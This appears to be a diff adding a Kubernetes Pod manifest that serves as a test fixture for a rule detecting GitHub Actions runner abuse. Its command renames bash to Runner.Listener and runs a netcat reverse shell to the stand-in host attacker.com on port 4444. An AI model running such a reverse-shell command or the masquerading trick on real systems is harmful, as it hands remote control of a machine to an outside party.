@@ -1,0 +1,15 @@
+#command: Runner.Listener spawns nc (GitHub Actions abuse)
+#note: actor_process_name should be Runner.Listener for full rule match
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: github-actions-runner-spawns-suspicious-process
+spec:
+  restartPolicy: Never
+  containers:
+  - name: github-actions-runner-spawns-suspicious-process
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ['sh']
+    args: ["-c", "cp /bin/bash Runner.Listener; ./Runner.Listener -c 'nc -e /bin/sh attacker.com 4444'; sleep infinity"]
